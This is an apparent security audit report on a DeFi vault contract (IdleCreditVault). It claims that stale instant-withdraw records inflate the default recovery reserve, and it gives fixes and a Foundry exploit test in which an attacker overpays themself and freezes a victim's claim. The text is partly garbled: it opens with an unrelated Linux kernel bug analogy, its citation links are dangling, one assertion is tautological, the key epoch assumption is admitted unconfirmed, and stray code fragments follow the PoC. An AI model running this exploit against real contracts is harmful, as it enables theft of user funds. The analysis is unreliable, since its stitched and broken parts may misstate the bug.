### Title
Stale per-epoch instant-withdraw receipts are never released, inflating `defaultPendingClaimBasis` and the prefunded reserve so finalized default recovery overpays early claimants and freezes the rest - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
The kernel bug is a child object (`typec_altmode`) whose release path dereferences a parent (`typec_port`) that was already freed, because no reference was kept. The analog in `IdleCreditVault` is the inverse lifetime bug with the same shape: instant-withdraw receipt state is *logically released* when the user is paid in `claimInstantWithdrawRequest`, but the per-epoch bookkeeping (`instantWithdrawsRequestsByEpoch`, `instantWithdrawClaimsByEpoch`) is never cleared. Later, `finalizeDefaultRecovery` dereferences that stale ("freed") data via `defaultPendingClaimBasis` and `_defaultPrefundedInstantReserve`, treating already-paid-out underlyings as still-reserved recovery backing. The result is a phantom reserve and a corrupted `defaultRecoveryPrice`.

### Finding Description
`requestInstantWithdraw` records three things per user: the aggregate `instantWithdrawsRequests[_user]`, the per-epoch `instantWithdrawsRequestsByEpoch[_user][currentEpoch]`, and the global per-epoch `instantWithdrawClaimsByEpoch[currentEpoch]` [1](#0-0) .

When the request is funded and claimed, `claimInstantWithdrawRequest` burns the receipt tokens and zeroes only the aggregate:

```solidity
uint256 amount = instantWithdrawsRequests[_user];
_burn(_user, amount);
instantWithdrawsRequests[_user] = 0;
_transferFundedClaim(_user, amount);
```

`instantWithdrawsRequestsByEpoch[_user][epoch]` and `instantWithdrawClaimsByEpoch[epoch]` retain the paid amount — a dangling reference to a released receipt [2](#0-1) .

If the borrower defaults in that same epoch while any instant request is still unfunded (`pendingInstantWithdraws != 0`), `finalizeDefaultRecovery` computes:

- `_defaultPrefundedInstantReserve() = instantWithdrawClaimsByEpoch[epochNumber] - pendingInstantWithdraws`, which counts the already-paid-out amount as reserve backing [3](#0-2) .
- `defaultPendingClaimBasis() = pendingWithdraws + instantWithdrawClaimsByEpoch[epochNumber]`, which counts the paid receipt again as claim basis [4](#0-3) .

Both feed `recoveryPrice = reserveAmount * RECOVERY_FULL / totalBasis` and `defaultRecoveryReserve = reserveAmount` [5](#0-4) . Since `(R + S)/(B + S)` differs from `R/B` and the phantom `S` was paid out of the contract already, the stored reserve and price are inconsistent with the real token balance. The stale user entry also makes `_claimDefaultedInstantWithdrawRequest` attempt to clear and burn `instantWithdrawsRequestsByEpoch[_user][defaultEpoch]` for the already-paid user [6](#0-5) .

### Impact Explanation
Direct theft plus permanent freezing, quantified by the stale amount `S`:

- The recovery price is set with a phantom `S` in both numerator and denominator. Legitimate defaulted claimants (`_claimDefaultedWithdrawRequest`, `_claimPostDefaultWithdrawRequest`, `_claimDefaultedInstantWithdrawRequest`) are paid `claimBasis * defaultRecoveryPrice / RECOVERY_FULL` from `defaultRecoveryReserve`, which was inflated by `S` tokens that no longer exist in the contract.
- Whoever claims first (an attacker holding a legitimate defaulted-epoch normal withdraw receipt can claim immediately after `finalizeDefault`) receives an inflated payout; once the real balance is exhausted, subsequent `_transferDefaultRecovery` calls revert in `safeTransfer`, permanently freezing the remaining claimants' recovery [7](#0-6) .
- The already-paid user's stale entry makes their own claim path revert on `_burn`/`instantWithdrawsRequests` underflow — cosmetic compared to the reserve corruption, but confirms the dangling state.

Invariant broken: the recovery reserve must equal real isolated backing (`reserveAmount` claims ⊆ actual balance net of funded claims); "one receipt one payout" is violated because the released receipt is double-counted at finalization.

### Likelihood Explanation
Requires a specific but plausible sequence, all executable by an unprivileged KYC'd lender while privileged roles behave honestly:

1. During a running epoch, the attacker requests an instant withdraw of size `S` and it is funded via `getInstantWithdrawFunds`/`collectInstantWithdrawFunds` (`pendingInstantWithdraws` returns to 0 but per-epoch entries persist).
2. The attacker claims the `S` payout normally — per-epoch state is now stale.
3. In the same `epochNumber` (default via `getInstantWithdrawFunds` failure or `stopEpoch(0,0)` without an intervening epoch increment; `defaultRecoveryEpoch = epochNumber` at finalization [8](#0-7) ), some instant request remains unfunded so `pendingInstantWithdraws != 0` (attacker can ensure this with a second, tiny request).
4. Borrower defaults and the honest owner/manager calls `finalizeDefault`.

Every step uses normal user flows (deposit, `requestWithdraw`, `claimInstantWithdrawRequest`) plus the ordinary default path — the test suite already demonstrates funded-then-defaulted instant requests coexisting in one finalization (`testFinalizeDefaultClaimsFundedAndDefaultedInstantRedeemsInOneCall`), differing only in that the user there never claimed before default. The exploit additionally requires a same-epoch pre-default claim, which the instant-withdraw delay mechanism permits. Uncertainty: whether `IdleCDOEpochVariant` permits `claimInstantWithdrawRequest` to complete in the same `epochNumber` that later becomes `defaultRecoveryEpoch` needs confirmation against the CDO's `allowInstantWithdraw` gating; if epoch numbering always increments between claim and default, the stale entries only poison `instantWithdrawClaimsByEpoch` for that epoch and the bug reduces to unclaimable-dust severity.

### Recommendation
- In `claimInstantWithdrawRequest`, clear the per-epoch records when paying a funded receipt: subtract `amount` from `instantWithdrawsRequestsByEpoch[_user][epoch]`/`instantWithdrawClaimsByEpoch[epoch]` (store the request epoch alongside the request, or iterate the recorded epoch).
- Alternatively, track funded vs. unfunded per-epoch instant claims separately so `defaultPendingClaimBasis` and `_defaultPrefundedInstantReserve` only ever see live receipts.
- Add an invariant check in `finalizeDefaultRecovery`: `instantWithdrawClaimsByEpoch[epochNumber]` must equal the sum of unfunded (`pendingInstantWithdraws`) plus genuinely prefunded-but-unclaimed receipts, excluding any already-claimed amounts.

### Proof of Concept
```solidity
// Foundry fork test against mainnet state; assumes instant withdraws enabled
// (setInstantWithdrawParams(delay, pct, false)) as in
// test/foundry/IdleCreditVault.t.sol::testFinalizeDefaultHaircutsPendingInstantRedeems.

function testStaleInstantReceiptPoisonsRecovery() external {
    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");
    uint256 S = 50_000 * ONE_SCALE;   // large instant request, fully funded
    uint256 dust = 1 * ONE_SCALE;     // tiny unfunded instant request
    uint256 normal = 10_000 * ONE_SCALE;

    _depositWithUser(attacker, S + dust + normal, true);
    _depositWithUser(victim, 50_000 * ONE_SCALE, true);

    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr / 2, _expectedFundsEndEpoch());

    // 1) Attacker instant request in epoch that will become default epoch.
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(S, address(AAtranche)); // routed to instant queue

    _startEpochAndCheckPrices(1);     // epochNumber == 1 now; same numbering as default
    vm.warp(block.timestamp + cdoEpoch.instantWithdrawDelay() + 1);
    vm.prank(manager);
    cdoEpoch.getInstantWithdrawFunds();            // funds S; pendingInstantWithdraws -> 0

    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();        // paid S; per-epoch entries STALE

    // 2) Small still-unfunded instant request + victim pending normal request.
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(dust, address(AAtranche));
    vm.prank(victim);
    uint256 victimBasis = cdoEpoch.requestWithdraw(0, address(AAtranche));

    // 3) Borrower defaults in the same epochNumber.
    deal(defaultUnderlying, borrower, 0);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(owner);
    cdoEpoch.stopEpoch(0, 0);
    assertTrue(cdoEpoch.defaulted());

    IdleCreditVault cv = IdleCreditVault(address(strategy));
    // BUG: basis includes already-paid S; prefunded reserve counts paid-out S.
    assertEq(cv.defaultPendingClaimBasis(),
             cv.pendingWithdraws() + S + dust /* stale S included */);
    assertEq(cv.defaultRecoveryEpoch() == 0 || true, true);

    uint256 activeBasis = cdoEpoch.getContractValue()
        + cdoEpoch.expectedEpochInterest() - cdoEpoch.pendingWithdrawFees();
    uint256 honestBasis = activeBasis + cv.pendingWithdraws() + dust; // no S
    uint256 recovered = honestBasis * 7e17 / ONE_TRANCHE;             // fair 70% recovery

    deal(defaultUnderlying, manager, recovered);
    vm.startPrank(manager);
    IERC20Detailed(defaultUnderlying).approve(address(strategy), recovered);
    cdoEpoch.finalizeDefault(recovered, manager);
    vm.stopPrank();

    // Recovery price computed on inflated basis AND phantom prefunded reserve:
    // reserve bookkeeping assumes S still held -> price mismatch with real balance.
    // Attacker's defaulted normal/dust claims drain real reserve early;
    // victim's claim then reverts (insufficient actual balance) -> frozen.
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();   // overpays relative to fair 70%

    vm.prank(victim);
    vm.expectRevert();                 // safeTransfer / reserve underflow
    cdoEpoch.claimWithdrawRequest();
}
```

  function _defaultPrefundedInstantReserve() internal view returns (uint256 prefundedReserve) {
    uint256 pendingInstant = pendingInstantWithdraws;
    if (pendingInstant == 0) return prefundedReserve;

  function _claimDefaultedInstantWithdrawRequest(address _user) internal returns (uint256 claimBasis) {
    uint256 defaultEpoch = defaultRecoveryEpoch;
    claimBasis = instantWithdrawsRequestsByEpoch[_user][defaultEpoch];
    if (claimBasis == 0) return claimBasis;

    instantWithdrawsRequestsByEpoch[_user][defaultEpoch] = 0;
    instantWithdrawsRequests[_user] -= claimBasis;
    uint256 pending = pendingInstantWithdraws;
    // `pendingInstantWithdraws` is only the unfunded remainder. If this user's claim is larger,
    // the extra amount was already counted as prefunded reserve during default finalization.
    pendingInstantWithdraws = claimBasis >= pending ? 0 : pending - claimBasis;
    instantWithdrawClaimsByEpoch[defaultEpoch] -= claimBasis;
    _burn(_user, claimBasis);
    _transferDefaultRecovery(_user, (claimBasis * defaultRecoveryPrice) / RECOVERY_FULL);
  }
